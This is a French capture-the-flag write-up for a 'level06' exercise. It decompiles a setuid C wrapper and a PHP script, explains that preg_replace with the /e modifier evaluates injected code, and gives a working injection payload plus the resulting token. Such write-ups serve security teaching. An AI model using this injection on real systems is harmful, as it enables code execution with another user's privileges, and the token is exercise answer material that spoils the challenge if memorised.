# [level06]

### Observations

##### Je décompile le programme '~/level06':
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	const char	**v3;
	char		*v4;
	char		*v5;
	__uid_t		v7;
	__gid_t		v8;
	char		**v9;
	char		*v10[11];

	v10[7] = (char *)&argc;
	v3 = argv;
	v9 = (char **)envp;
	v4 = strdup(&s);
	v5 = strdup(&s);
	if ( v3[1] )
	{
		free(v4);
		v4 = strdup(v3[1]);
		if ( v3[2] )
		{
			free(v5);
			v5 = strdup(v3[2]);
		}
	}
	v8 = getegid();
	v7 = geteuid();
	setresgid(v8, v8, v8);
	setresuid(v7, v7, v7);
	v10[2] = v4;
	v10[3] = v5;
	v10[0] = "/usr/bin/php";
	v10[1] = "/home/user/level06/level06.php";
	v10[4] = 0;
	execve("/usr/bin/php", v10, v9);
	return 0;
}
```

##### J'affiche le programme '~/level06.php':
```php
#!/usr/bin/php
<?php
function y($m)
{
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z)
{
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

##### Détails des programmes:
```bash
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

##### Entrées du programme '~/level6'
```c
char *chemin_fichier
```

##### Fonctionnement:
Il y a deux programmes:
 1. Le premier est un programme c qui exécute un script php '~/level06.php' avec les droit de l'utilisateur 'flag06'.
 2. Le deuxieme applique un motif regex '/(\[x (.*)\])/e' qui transforme le contenue du fichier par le contenu du deuxieme argument après l'avoir évalué.

##### Conclusions:
La fonction de remplacement de motif regex preg_replace avec le parametre '/e' est connue pour avoir des failles. \
En effet le parametre permet d'exécuter du code php. \
Je peux donc exécuter du code shell librement.

### Résolution
Je créé un fichier qui contient mon injection de code, puis je passe le chemin d'acces de ce dernier au programme '~/level6'. \
Le contenue de la deuxieme couche de regex est evaluée en php car l'opérateur '/e' est utilisé. \
Le parseur php exécute ensuite 'getflag' car il est entouré par les caractéres '`'. \
J'exécute ensuite le programme.

#### commandes:
```bash
echo '[x ${`getflag`}]' >/tmp/script
./level06 /tmp/script
```

**token :** wiok45aaoguiboiki2tuin6ub